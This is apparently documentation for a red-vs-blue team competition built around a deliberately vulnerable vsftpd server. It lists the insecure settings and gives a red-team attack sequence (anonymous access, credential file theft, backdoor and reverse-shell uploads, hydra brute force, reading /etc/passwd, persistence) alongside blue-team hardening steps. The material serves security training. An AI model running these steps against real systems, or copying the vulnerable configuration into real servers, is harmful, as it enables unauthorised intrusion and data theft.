# FTP Service - Blue vs Red Team Competition

## Service Overview

The FTP (File Transfer Protocol) service is configured as a vulnerable vsftpd server designed for cybersecurity training and competition. This service simulates a misconfigured FTP server commonly found in enterprise environments, providing both attack surfaces for Red Teams and monitoring challenges for Blue Teams.

### Key Features
- **Vulnerable Configuration**: Intentionally misconfigured for training purposes
- **Monitoring Integration**: Built-in logging and fail2ban protection
- **Realistic Data**: Contains fake sensitive data for realistic scenarios
- **Automated Scoring**: Integrated with the competition scoring system

## Service Architecture

### Configuration Files
- **Main Configuration**: `/etc/vsftpd.conf` (vulnerable settings)
- **Monitoring Script**: `/usr/local/bin/ftp-monitor.sh`
- **Fail2Ban Jail**: `/etc/fail2ban/jail.d/vsftpd.conf`

### Network Settings
- **Port**: 21/tcp
- **Protocol**: FTP (unencrypted)
- **Firewall**: iptables rules allowing FTP traffic

## Intentional Vulnerabilities

### 1. Anonymous Access Vulnerabilities
```conf
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
anon_umask=000
```
 Risk: Complete anonymous read/write access
 
 Impact: Unauthenticated file uploads and directory modifications

### 2. Weak File Permissions
```conf
local_umask=000
anon_umask=000
```
Risk: World-readable and writable files

Impact: Sensitive data exposure and unauthorized modifications

### 3. Security Bypass Vulnerabilities
```conf
chroot_local_user=NO
allow_writeable_chroot=YES
ssl_enable=NO
```
Risk: No user confinement, cleartext authentication

Impact: Directory traversal and credential sniffing

### 4. Information Disclosure
```conf
ftpd_banner=Welcome to Troy (FTP v2.3.4)
```
Risk: Version and system information exposure

Impact: Reconnaissance and targeted attacks

### 5. Weak User Accounts

Pre-configured users with weak passwords

Default credentials and predictable patterns

### 6. Fake Sensitive Data

The service contains intentionally planted fake sensitive data:

    secret-plans.txt - Confidential operational plans

    user-creds.csv - User credentials (fake)

    network-diagram.pdf - Fake network infrastructure

    .ssh-key-ovid - REAL SSH private key

## Red Team
### Phase 1: Recon
```bash
# Service discovery
nmap -p 21 10.1.0.0/24
# Banner grabbing
telnet 10.1.0.X 21
# Anonymous access testing
ftp 10.1.0.X
# Username: anonymous
# Password: (any)
```
### Phase 2: Initial Access
```bash
# Anonymous file listing
ftp> ls -la
# Download sensitive files
ftp> get secret-plans.txt
ftp> get user-creds.csv
# Upload backdoors
ftp> put shell.php
ftp> put reverse-shell.sh
```
### Phase 3: Privilege Escalation
```bash
# Brute force weak users
hydra -L users.txt -P passwords.txt ftp://10.1.0.X
# Exploit directory traversal (if available)
ftp> cd /etc
ftp> get passwd
```
### Phase 4: Persistence
```bash
# Create hidden directories
ftp> mkdir .hidden
ftp> put persistence-script.sh .hidden/
# Modify existing scripts
ftp> put malicious-code.sh /usr/local/bin/ftp-monitor.sh
```
### Phase 5: Data Exfiltration
```bash
# Archive and download sensitive data
ftp> put tar-czf sensitive-data.tar.gz /srv/ftp/
ftp> get sensitive-data.tar.gz
```
## Blue Team
### Phase 1: Immediate Actions

    Disable Anonymous Access

```conf
anonymous_enable=NO
anon_upload_enable=NO
anon_mkdir_write_enable=NO
```
#### Strengthen File Permissions

```conf
local_umask=077
anon_umask=077
chroot_local_user=YES
```
#### Enable Logging and Monitoring

```bash
# Verify logs are working
tail -f /var/log/vsftpd.log
/usr/local/bin/ftp-monitor.sh
```
### Phase 2: Access Control

#### Implement User Restrictions

```conf
userlist_enable=YES
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO
```
#### Create Allow List

```bash
echo "allowed_user1" >> /etc/vsftpd.userlist
echo "allowed_user2" >> /etc/vsftpd.userlist
```
#### Network Restrictions

```bash
# Limit source IPs in iptables
iptables -A INPUT -p tcp --dport 21 -s 10.1.0.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j DROP
```
### Phase 3: Security Enhancements

#### Enable TLS Encryption

```conf
ssl_enable=YES
allow_anon_ssl=NO
force_local_logins_ssl=YES
```
#### Configure Fail2Ban Rules

```conf
# Enhanced jail configuration
[vsftpd]
enabled = true
port = ftp
filter = vsftpd
logpath = /var/log/vsftpd.log
maxretry = 2
bantime = 3600
findtime = 600
```
#### File Integrity Monitoring

```bash
# Monitor critical files
apt install aide
aide --init
aide --check
```
### Phase 4: Advanced Monitoring

#### Enhanced Monitoring Script

```bash
#!/bin/bash
# Add to /usr/local/bin/ftp-monitor.sh
# Monitor for suspicious activities
tail -100 /var/log/vsftpd.log | grep -i "upload\|delete\|rename" >> /var/log/ftp-suspicious.log
# Check file modifications
find /srv/ftp -type f -mmin -5 -exec echo "Modified: {}" \; >> /var/log/ftp-changes.log
```
#### Real-time Alerting
```bash
# Add to cron for regular checks
*/2 * * * * /usr/local/bin/ftp-monitor.sh
```